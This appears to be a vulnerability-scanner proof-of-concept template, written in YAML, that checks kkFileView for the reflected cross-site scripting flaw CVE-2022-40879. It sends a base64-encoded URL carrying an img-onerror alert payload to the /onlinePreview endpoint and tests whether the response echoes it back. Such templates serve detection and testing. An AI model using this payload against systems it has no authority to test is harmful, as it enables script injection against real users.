name: yaml-poc-keking-kkfileview-xss-CVE-2022-40879
binding: d7407319-8120-4048-b032-6d07270091e0
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-40879/
        - https://github.com/kekingcn/kkFileView/issues/389
    vulnerability:
        id: 91c0f4ed-e30d-4f52-9902-aa841745b024
        level: medium
    warning: Harmless
transport: http
set:
    rand: randomInt(100000, 200000)
    payload: base64("https://www.google.<img src=1 onerror=alert(" + string(rand) + ")>=PQ")
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /onlinePreview?url={{payload}}
        expression: response.status == 200 && response.body.bcontains(bytes("<img src=1 onerror=alert(" + string(rand) + ")>=PQ</p>"))
expression: r0()
